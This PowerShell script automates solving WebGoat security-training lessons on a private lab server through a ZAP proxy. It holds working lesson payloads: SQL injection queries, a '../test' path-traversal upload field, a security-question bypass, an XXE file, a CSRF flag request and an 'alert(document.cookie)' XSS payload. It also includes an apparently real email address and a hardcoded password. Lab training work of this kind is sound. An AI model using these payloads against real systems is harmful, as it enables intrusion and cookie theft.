
$urlbase = "http://192.168.2.130:5000"
$zap_proxy = "http://172.18.24.246:8082" 
$user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"

#---------------------------------------------------------------------------------------------------------------------------
# Create User
#---------------------------------------------------------------------------------------------------------------------------
Clear-Host

$createuser = $false

if($createuser){

    $response = wget "$urlbase/Account/Register" -UserAgent $user_agent  -Proxy $zap_proxy 
    $token = $response.ParsedHtml.getElementsByName('__RequestVerificationToken').item(0).value


    $body='Username=M0l1n3ta&Email=EmilioJRoldan%40gmail.com&CompanyName=Sogeti&Password=Sogeti1234&ConfirmedPassword=Sogeti1234&Address=Zabaleta+42&City=Madrid&Region=Madrid&PostalCode=28701&Country=Spain&role=admin&__RequestVerificationToken={0}' -f $token
    $response = wget "$urlbase/Account/Register" -Method Post -Body $body -SessionVariable session  -ContentType "application/x-www-form-urlencoded" -Proxy $zap_proxy
    $response.ParsedHtml.getElementsByTagName('strong').item(0).innerText
    $response =  wget "$urlbase/Account/Logout" -WebSession $session -Proxy $zap_proxy
     
}

#---------------------------------------------------------------------------------------------------------------------------
# Login
#---------------------------------------------------------------------------------------------------------------------------
$session = $null
$response = wget "$urlbase/Account/Login" -UserAgent $user_agent   -Proxy $zap_proxy 
$token = $response.ParsedHtml.getElementsByName('__RequestVerificationToken').item(0).value



$body = "ReturnUrl=%2F&Username=M0l1n3ta&Password=Sogeti1234&__RequestVerificationToken={0}&RememberMe=false" -f $token
$response = wget "$urlbase/Account/Login?returnUrl=%2F" -SessionVariable session -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $user_agent  -Proxy $zap_proxy 
$response.ParsedHtml.getElementsByTagName('strong').item(0).innerText

#---------------------------------------------------------------------------------------------------------------------------
# SQLi attack
#---------------------------------------------------------------------------------------------------------------------------

#Add ellements to cart
$response = wget "$urlbase/Product/Details/20" -WebSession $session
$token = $response.ParsedHtml.getElementsByName('__RequestVerificationToken').item(0).value

$session.Headers.Add('Referer',"http://192.168.2.130:5000/Product/Details/20")
$body = "Quantity=4&__RequestVerificationToken={0}" -f $token
$response = wget "$urlbase/Card/AddOrder/20" -WebSession $session -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $user_agent  -Proxy $zap_proxy 
$response.ParsedHtml.getElementsByTagName('h1').item(0).innerText

# Make Order
$response = wget "$urlbase/Checkout/Checkout" -WebSession $session -UserAgent $user_agent  -Proxy $zap_proxy 
$token = $response.ParsedHtml.getElementsByName('__RequestVerificationToken').item(0).value

$body = "ShipTarget=Sogeti&Address=Zabaleta+43&City=Madrid&Region=Madrid&PostalCode=28701&Country=Spain&ShippingMethod=1&CreditCard=4111+1111+1111+1111&ExpirationMonth=01&ExpirationYear=2022&__RequestVerificationToken={0}&RememberCreditCard=false" -f $token
$response = wget "$urlbase/Checkout/Checkout" -WebSession $session -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $user_agent  -Proxy $zap_proxy 
$order = $response.ParsedHtml.querySelector(".receiptDiv").children.item(0).innerText



#A1 Injection

$session.Headers.Add('X-Requested-With','XMLHttpRequest')
$session.Headers.Add("Content-Type","application/x-www-form-urlencoded; charset=UTF-8")


$body = "query=select+*+from+employees+where+userid+%3D+96134"
$response = $null
$response = wget "$urlbase/WebGoat/SqlInjection/attack2" -Method Post -Body $body -WebSession $session -Proxy $zap_proxy 
$resultado = ConvertFrom-Json $response.Content
if([bool]$resultado.lessonCompleted){write-host "Lección SQLi 1  superada!!!"}


$body = "query=UPDATE+employees+set++department++%3D+'Sales'+WHERE+userid+%3D+89762%3B"
$response = wget "$urlbase/WebGoat/SqlInjection/attack3" -Method Post -Body $body -WebSession $session -Proxy $zap_proxy 
$resultado = ConvertFrom-Json $response.Content
if([bool]$resultado.lessonCompleted){write-host "Lección SQLi 2  superada!!!"}

#Path 

$fileBin = [System.IO.File]::ReadAllBytes("$PSScriptRoot\Resources\Logo_NN4ED.png")
$enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
$fileEnc = $enc.GetString($fileBin)
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"uploadedFile`"; filename=`"Logo_NN4ED.png`"",
    "Content-Type: image/png$LF",
    $fileEnc,
    "--$boundary",
    "Content-Disposition: form-data; name=`"fullName`"$LF",
    "../test",
    "--$boundary",
    "Content-Disposition: form-data; name=`"email`"$LF",
    "pepe@pepe.com",
    "--$boundary",
    "Content-Disposition: form-data; name=`"password`"$LF",
    "1234",
    "--$boundary--$LF"
    
) -join $LF

$response  = wget -Uri "$urlbase/WebGoat/PathTraversal/profile-upload" -Method Post -WebSession $session -ContentType "multipart/form-data; boundary=""$boundary""" -Body $bodyLines -Proxy $zap_proxy 
$resultado = ConvertFrom-Json $response.Content
if([bool]$resultado.lessonCompleted){write-host "Lección Path Traversal  superada!!!"}


#---------------------------------------------------------------------------------------------------------------------------
# Broken Authentication
#---------------------------------------------------------------------------------------------------------------------------
$body = "secQuestion7=pepe&secQuestion8=pepe&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746"
$response  = wget -Uri "$urlbase/WebGoat/auth-bypass/verify-account" -Method Post -WebSession $session -ContentType "application/x-www-form-urlencoded" -Body $body -Proxy $zap_proxy 
$resultado = ConvertFrom-Json $response.Content
if([bool]$resultado.lessonCompleted){write-host "Lección Broken Authentication superada!!!"}


#---------------------------------------------------------------------------------------------------------------------------
# Sensitive Data Exposure
#---------------------------------------------------------------------------------------------------------------------------
$body = "{`"username`":`"CaptainJack`",`"password`":`"BlackPearl`"}"
try{
    $response  = wget -Uri "$urlbase/WebGoat/start.mvc" -Method Post -WebSession $session -Body $body -Proxy $zap_proxy
}catch [System.Net.WebException]
{
    write-host "OK: $_.Exception.Message"
}
$body= "username=CaptainJack&password=BlackPearl"
$response  = wget -Uri "$urlbase/WebGoat/InsecureLogin/task" -Method Post -WebSession $session -ContentType "application/x-www-form-urlencoded" -Body $body -Proxy $zap_proxy 

$resultado = ConvertFrom-Json $response.Content
if([bool]$resultado.lessonCompleted){write-host "Lección Broken Sensitive Data Exposure superada!!!"}

#---------------------------------------------------------------------------------------------------------------------------
# Xml External Entities (XXE)
#---------------------------------------------------------------------------------------------------------------------------
$response  = Invoke-RestMethod -Uri "$urlbase/WebGoat/XXE.lesson.lesson" -WebSession $session -Proxy $zap_proxy 

$body = Get-Content "$PSScriptRoot\Resources\XXE_1.xml"
$response  = Invoke-RestMethod  -Uri "$urlbase/WebGoat/xxe/simple" -Method Post -WebSession $session -ContentType "application/xml" -Body $body -Proxy $zap_proxy 

if([bool]$response.lessonCompleted){write-host "Lección Xml External Entities (XXE) superada!!!"}


#---------------------------------------------------------------------------------------------------------------------------
# Cross-Site Request Forgery (CSRF) attack
#---------------------------------------------------------------------------------------------------------------------------


$response = wget "$urlbase/WebGoat/CSRF.lesson.lesson" -WebSession $session -Proxy $zap_proxy 
$response = wget "$urlbase/WebGoat/service/lessoninfo.mvc" -WebSession $session -Proxy $zap_proxy 
$response = wget "$urlbase/WebGoat/csrf/review" -WebSession $session -Proxy $zap_proxy 
 

$body = "csrf=true&submit=Submit+Query"
$response  = Invoke-RestMethod  -Uri "$urlbase/WebGoat/csrf/basic-get-flag" -Method Post -WebSession $session -ContentType "application/x-www-form-urlencoded" -Body $body -Proxy $zap_proxy 


$response.flag
$body = "confirmFlagVal={0}" -f $response.flag
$response = Invoke-RestMethod  -Uri "$urlbase/WebGoat/csrf/confirm-flag-1" -Method Post -WebSession $session -Body $body -Proxy $zap_proxy 

if([bool]$response.lessonCompleted){write-host "Lección Cross-Site Request Forgery (CSRF) superada!!!"}


#---------------------------------------------------------------------------------------------------------------------------
# Cross-Site Scripting (XSS) attack
#---------------------------------------------------------------------------------------------------------------------------


$response = wget "$urlbase/WebGoat/CrossSiteScripting.lesson.lesson" -WebSession $session -Proxy $zap_proxy 


$response = Invoke-RestMethod "$urlbase/WebGoat/CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=4128%203214%200002%201999&field2=alert(document.cookie)" -WebSession $session -Proxy $zap_proxy 

if([bool]$response.lessonCompleted){write-host "Lección Cross-Site Scripting (XSS) superada!!!"}
